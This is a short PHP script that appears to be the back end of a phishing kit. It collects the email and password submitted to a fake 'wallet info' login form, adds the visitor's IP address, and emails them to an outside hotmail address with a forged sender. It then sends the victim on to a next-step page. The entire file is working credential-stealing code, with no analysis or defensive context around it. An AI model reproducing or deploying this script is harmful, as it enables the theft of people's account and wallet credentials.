<?
$PP = getenv("REMOTE_ADDR");
$ip = getenv("REMOTE_ADDR");
$message .= "\n\n";
$message .= "++++++++++<[ wallet info ]>++++++++++\n";
$message .= "email: ".$_POST['id1']."\n";
$message .= "password: ".$_POST['id2']."\n";

$message .= "IP: ".$ip."\n\n";

$recipient = "rezultreport@hotmail.com";
$subject = "Just Saying | $ip";
$headers = "From: Just <just@t3chsss.net>";
mail($recipient,$subject,$message,$headers);
header("Location: step.html");
?>